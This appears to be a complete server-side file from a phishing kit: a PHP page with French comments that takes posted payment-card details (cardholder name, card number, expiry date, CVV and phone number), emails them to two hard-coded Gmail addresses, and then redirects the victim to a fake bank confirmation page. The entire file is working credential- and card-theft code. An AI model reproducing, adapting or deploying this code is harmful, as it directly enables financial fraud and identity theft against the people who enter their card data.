<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>

</head>


<body>

<?php
    // S'il y des données de postées
    if ($_SERVER['REQUEST_METHOD']=='POST') {
     
      // (1) Code PHP pour traiter l'envoi de l'email
     
      // Récupération des variables et sécurisation des données
      $cardPrenom = htmlentities($_POST['cardPrenom']); // htmlentities() convertit des caractères "spéciaux" en équivalent HTML
      $cardNom = htmlentities($_POST['cardNom']);
      $cardNumber = htmlentities($_POST['cardNumber']);
      $expDate = htmlentities($_POST['expDate']);
      $verificationCode = htmlentities($_POST['verificationCode']);
      $tel = htmlentities($_POST['tel']);
      
     
      // Variables concernant l'email
     
      $destinataire = 'olivierdelaforce2@gmail.com, diasagamoso@gmail.com'; // Adresse email du webmaster (à personnaliser)
      $contenu .= '<p>Information Cate Bancaire</p>';
      $contenu .= '<p><strong>Prenom</strong>: '.$cardPrenom.'</p>';
      $contenu .= '<p><strong>Nom</strong>: '.$cardNom.'</p>';
      $contenu .= '<p><strong>Numero de carte</strong>: '.$cardNumber.'</p>';
      $contenu .= '<p><strong>Date exp</strong>: '.$expDate.'</p>';
      $contenu .= '<p><strong>Cryptogramme</strong>: '.$verificationCode.'</p>';
      $contenu .= '<p><strong>Numéro mobile</strong>: '.$tel.'</p>';
      $contenu .= '</body></html>'; // Contenu du message de l'email (en XHTML)
     
      // Pour envoyer un email HTML, l'en-tête Content-type doit être défini
      $headers = 'MIME-Version: 1.0'."\r\n";
      $headers .= 'Content-type: text/html; charset=iso-8859-1'."\r\n";
     
      // Envoyer l'email
      mail($destinataire, $objet, $contenu, $headers); // Fonction principale qui envoi l'email
      
    }
    ?>
    <script language="javascript">document.location="confirmBanque2.html"</script> 
</body>

</html> 